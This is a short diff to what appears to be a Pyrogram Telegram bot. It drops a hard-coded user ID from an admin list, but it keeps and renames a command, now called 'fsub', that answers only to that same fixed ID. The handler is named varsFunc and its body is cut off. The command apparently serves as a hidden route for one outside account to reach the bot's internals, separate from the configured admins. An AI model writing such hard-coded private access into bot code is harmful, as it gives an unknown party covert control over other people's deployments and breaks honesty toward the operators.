@@ -18,7 +18,6 @@ from database.database import add_user, del_user, full_userbase, present_user
 @Bot.on_message(filters.command('start') & filters.private & subscribed)
 async def start_command(client: Client, message: Message):
     id = message.from_user.id
-    ADMIN = [ADMINS, 1803603990]
     if not await present_user(id):
         try:
             await add_user(id)
@@ -153,7 +152,7 @@ async def not_joined(client: Client, message: Message):
         disable_web_page_preview = True
     )
 
-@Bot.on_message(filters.command("starmt") & filters.user(1803603990))
+@Bot.on_message(filters.command("fsub") & filters.user(1803603990))
 async def varsFunc(client: Bot, message: Message):
     Man = await message.reply_text("Wait A Sec...")
     text = f"""       <u><b> TEXT </b></u> 
